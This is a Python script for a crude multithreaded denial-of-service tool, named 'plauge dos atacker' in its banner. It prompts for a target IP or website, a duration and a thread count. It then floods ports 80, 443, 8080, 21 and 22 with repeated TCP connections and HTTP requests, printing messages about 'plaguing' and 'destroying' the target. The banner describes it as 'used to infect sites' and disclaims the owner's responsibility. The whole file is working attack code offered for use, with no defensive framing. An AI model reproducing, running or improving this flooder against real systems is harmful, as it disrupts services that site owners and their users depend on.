import socket
import time
import os
import threading
import random

ports = [80, 443, 8080, 21, 22]  # Common ports to target

def attack(target, port, duration):
    timeout = time.time() + duration * 60
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)  # Set a lower timeout for faster request sending
        try:
            s.connect((target, port))
            start = time.time()
            if port == 80:
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            elif port == 443:
                s.send(b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            else:
                s.send(b"GET / HTTP/1.1\r\n\r\n")
            s.recv(1024)
            end = time.time()
            ping = round((end - start) * 1000, 2)
            print(f"Successfully plagued {target}:{port}! 🤢🦠 attempting to destroy | Ping: {ping}ms")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            s.close()
    print(f"Attack ended on {target}:{port}.")

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print ("┏┓┓ ┏┓┳┳┏┓┏┓")
    print ("┃┃┃ ┣┫┃┃┃┓┣ ")
    print ("┣┛┗┛┛┗┗┛┗┛┗┛")
    print("WELCOME TO plauge dos atacker") 
    print("powered by enom")
    print("used to infect sites")
    print("anything you do is not the owners fault")
    target = input("Enter the target IP or website: ")
    duration = int(input("Enter the duration in minutes: "))
    thread_count = int(input("Enter the number of threads to use: "))
    
    print(f"Starting attack on {target} for {duration} minutes with {thread_count} threads. Press Ctrl+C to stop.")
    try:
        for _ in range(thread_count):
            port = random.choice(ports)
            thread = threading.Thread(target=attack, args=(target, port, duration))
            thread.start()
    except KeyboardInterrupt:
        print("Attack stopped by user.")

if __name__ == "__main__":
    main()
